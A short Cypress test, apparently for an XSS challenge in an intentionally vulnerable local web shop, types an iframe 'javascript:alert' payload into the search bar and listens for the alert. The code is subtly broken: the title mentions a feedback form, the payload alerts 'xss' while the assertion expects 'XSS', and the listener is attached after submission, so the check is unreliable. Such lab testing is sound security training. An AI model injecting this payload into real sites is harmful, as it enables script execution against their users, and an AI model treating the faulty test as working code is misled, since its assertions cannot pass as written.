describe('XSS Challenge', () => {
  beforeEach(() => {
    cy.visit('http://localhost:3000/#/login');
    cy.handleCookieAndDialogues();
  });

  it('injects XSS payload into feedback form', () => {
    cy.get('.mat-search_icon-search').click();
    cy.get('.mat-toolbar-row .mat-form-field-infix').type('<iframe src="javascript:alert(`xss`)">');
    cy.get('.mat-toolbar-row .mat-form-field-infix').type('{enter}');

    // Check if the payload is executed
    cy.on('window:alert', (str) => {
        expect(str).to.equal('XSS');
    });
  });
});